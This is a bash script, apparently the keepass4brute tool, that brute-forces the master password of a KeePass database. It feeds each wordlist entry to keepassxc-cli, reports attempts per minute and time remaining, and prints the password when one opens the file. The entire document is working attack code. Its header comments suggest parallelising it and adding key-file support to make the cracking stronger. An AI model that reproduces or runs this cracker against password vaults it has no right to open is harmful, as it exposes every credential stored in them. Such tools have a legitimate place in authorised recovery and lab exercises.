#!/bin/bash
set -euo pipefail

# keepass4brute.sh - Brute-force attack script for KeePass databases using keepassxc-cli
# 
# Script flow and improvement notes:
# - Prints version and usage info.
# - Checks for required arguments and dependencies.
# - Reads the wordlist line by line, tracking progress and ETA.
# - For each password:
#     - Prints progress and current attempt.
#     - Pipes the password to keepassxc-cli open.
#     - If successful (exit code 0), prints the password and exits.
#     - Otherwise, moves to the next password.
# - If no password matches, prints a failure message.
#
# Areas for improvement:
# - The script is single-threaded; parallelization would greatly increase speed.
# - Each keepassxc-cli call is a separate process, which is slow; using a native cracking tool would be faster.
# - Output parsing could be improved to avoid false positives (check for a unique success message).
# - Progress reporting could be made optional for less overhead.
# - Support for key files or additional authentication methods could be added.
# - Error handling for corrupted or locked databases could be improved.
# - Consider memory and CPU usage when scaling up (e.g., with parallelization).
#

# https://github.com/r3nt0n/keepass4brute
# Name: keepass4brute.sh
# Author: r3nt0n
# Version: 1.0 (25/11/2022)

version="1.3"
printf "keepass4brute %s by r3nt0n\n" "$version"
printf "https://github.com/r3nt0n/keepass4brute\n\n"

if [ "$#" -ne 2 ]; then
  printf "Usage: %s <kdbx-file> <wordlist>\n" "$0"
  exit 2
fi

dep="keepassxc-cli"
if ! command -v "$dep" >/dev/null 2>&1; then
  printf "Error: %s not installed.  Aborting.\n" "$dep" >&2
  exit 1
fi

kdbx_file="$1"
wordlist="$2"

n_total=$(wc -l < "$wordlist")
start_time=$(date +%s)
n_tested=0

IFS=''
while read -r line || [ -n "$line" ]; do
  n_tested=$((n_tested + 1))
  current_time=$(date +%s)
  elapsed_time=$((current_time - start_time))

  if [ "$elapsed_time" -gt 0 ]; then
    attempts_per_minute=$((n_tested * 60 / elapsed_time))
    remaining_attempts=$((n_total - n_tested))
    if [ "$attempts_per_minute" -gt 0 ]; then
      estimated_time_remaining_seconds=$((remaining_attempts * 60 / attempts_per_minute))
    else
      estimated_time_remaining_seconds=0
    fi

    estimated_time_remaining_minutes=$((estimated_time_remaining_seconds / 60))
    estimated_time_remaining_seconds=$((estimated_time_remaining_seconds % 60))

    estimated_time_remaining_hours=$((estimated_time_remaining_minutes / 60))
    estimated_time_remaining_minutes=$((estimated_time_remaining_minutes % 60))

    estimated_time_remaining_days=$((estimated_time_remaining_hours / 24))
    estimated_time_remaining_hours=$((estimated_time_remaining_hours % 24))

    estimated_time_remaining_weeks=$((estimated_time_remaining_days / 7))
    estimated_time_remaining_days=$((estimated_time_remaining_days % 7))

    if [ "$estimated_time_remaining_weeks" -gt 0 ]; then
      estimated_time_remaining="$estimated_time_remaining_weeks weeks, $estimated_time_remaining_days days"
    elif [ "$estimated_time_remaining_days" -gt 0 ]; then
      estimated_time_remaining="$estimated_time_remaining_days days, $estimated_time_remaining_hours hours"
    elif [ "$estimated_time_remaining_hours" -gt 0 ]; then
      estimated_time_remaining="$estimated_time_remaining_hours hours, $estimated_time_remaining_minutes minutes"
    elif [ "$estimated_time_remaining_minutes" -gt 0 ]; then
      estimated_time_remaining="$estimated_time_remaining_minutes minutes, $estimated_time_remaining_seconds seconds"
    else
      estimated_time_remaining="$estimated_time_remaining_seconds seconds"
    fi
  else
    attempts_per_minute=0
    estimated_time_remaining="Calculating..."
  fi

  printf "\e[2K\r[+] Words tested: %d/%d - Attempts per minute: %d - Estimated time remaining: %s" "$n_tested" "$n_total" "$attempts_per_minute" "$estimated_time_remaining"
  printf "\n\e[2K\r[+] Current attempt: %s\n" "$line"

  if printf '%s\n' "$line" | keepassxc-cli open "$kdbx_file" &> /dev/null; then
    printf "\n[*] Password found: %s\n" "$line"
    exit 0
  fi
  printf "\e[2A"
done < "$wordlist"

printf "\n[!] Wordlist exhausted, no match found\n"
exit 3